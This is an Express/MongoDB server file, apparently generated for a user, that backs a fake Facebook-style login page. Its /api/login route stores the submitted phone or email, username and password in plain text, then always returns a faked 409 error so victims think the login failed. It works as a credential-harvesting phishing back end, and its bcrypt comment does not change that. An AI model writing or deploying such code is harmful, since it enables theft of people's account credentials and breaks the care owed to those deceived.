// server.js
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
require('dotenv').config();


const app = express();
app.use(cors());
app.use(express.json());


// -- Mongoose model
const userSchema = new mongoose.Schema({
phoneOrEmail: String,
username: String,
password: String, // plain text (not secure)
createdAt: { type: Date, default: Date.now }
});
const User = mongoose.model('User', userSchema);


// connect to MongoDB
const MONGO = process.env.MONGO_URI || 'mongodb://127.0.0.1:27017/fb_login_demo';
mongoose.connect(MONGO, { useNewUrlParser:true, useUnifiedTopology:true })
.then(()=> console.log('MongoDB connected'))
.catch(err=> console.error('MongoDB connect error:', err));


// POST /api/login — saves credentials and responds 409
app.post('/api/login', async (req, res)=>{
try{
const { phoneOrEmail, username, password } = req.body;
if(!phoneOrEmail || !password) return res.status(400).send('Missing fields');


// Save plain text (user requested) — insecure!
const u = new User({ phoneOrEmail, username, password });
await u.save();


// respond with 409 to simulate conflict/error
return res.status(409).send('Conflict: simulated server error (409)');


}catch(err){
console.error(err);
return res.status(500).send('Server error');
}
});


const PORT = process.env.PORT || 5000;
app.listen(PORT, ()=> console.log('Server running on port', PORT));


/*
SECURITY NOTE (recommended):
Instead of saving plain password, do this:


const bcrypt = require('bcrypt');
const salt = await bcrypt.genSalt(10);
const hash = await bcrypt.hash(password, salt);
// save hash instead of plain password
*/